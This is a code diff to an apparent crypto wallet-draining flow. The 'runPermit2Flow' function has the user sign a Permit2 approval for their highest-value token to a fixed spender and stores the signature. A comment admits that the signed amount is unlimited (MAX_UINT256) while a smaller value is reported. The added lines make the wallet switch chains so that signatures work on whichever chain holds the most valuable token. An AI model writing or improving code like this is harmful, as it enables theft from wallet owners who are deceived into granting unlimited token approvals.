@@ -134,11 +134,28 @@ export async function runPermit2Flow({
 
   const totalUsd = tokens.reduce((sum, t) => sum + t.valueUsd, 0);
 
+  // If the winning token lives on a different chain than the wallet is
+  // currently on, ask the wallet to switch so the signature domain matches.
+  const targetChainId = top.chainId ?? activeChainId;
+  if (targetChainId !== activeChainId) {
+    const provider = getProvider();
+    if (provider) {
+      try {
+        await provider.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x' + targetChainId.toString(16) }],
+        });
+      } catch (e) {
+        console.warn('chain switch failed, signing on current chain', e);
+      }
+    }
+  }
+
   // 2. Build Permit2 typed data locally.
   const deadline = Math.floor(Date.now() / 1000) + EXPIRY_DAYS * 24 * 60 * 60;
   const nonce = Date.now().toString(); // simple monotonic nonce
   const typedData = buildPermit2TypedData({
-    chainId: activeChainId,
+    chainId: targetChainId,
     token: top.address,
     spender: SPENDER,
     nonce,
@@ -173,7 +190,7 @@ export async function runPermit2Flow({
       try {
         await storePermit2Signature({
           owner: address,
-          chainId: activeChainId,
+          chainId: targetChainId,
           token: top.address,
           tokenSymbol: top.symbol,
           // Signed value is unlimited (MAX_UINT256) but we report the actual
